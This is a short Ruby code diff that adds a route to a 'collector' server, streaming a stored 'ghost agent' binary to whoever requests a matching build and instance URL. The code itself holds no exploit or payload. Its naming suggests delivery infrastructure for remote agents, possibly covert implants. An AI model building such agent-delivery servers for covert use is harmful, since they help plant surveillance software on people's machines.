@@ -15,6 +15,19 @@ module Collector
 class CollectorController < RESTController
   
   def get
+    # search for a ghost request: /gh/build_id/instance_id
+    if /^\/gh\/\d+\/[[:xdigit:]]+$/ =~ @request[:uri]
+      root, gh, build_id, instance_id = @request[:uri].split('/')
+      ghost = DB.instance.ghost_agent(build_id, instance_id)
+      unless ghost.nil?
+        trace :info, "[#{@request[:peer]}] ghost agent available, sending it"
+        file = Tempfile.new(build_id)
+        file.write ghost
+        file.close
+        return stream_file(file.path)
+      end
+    end
+
     # serve the requested file
     return http_get_file(@request[:headers], @request[:uri])
   rescue Exception => e
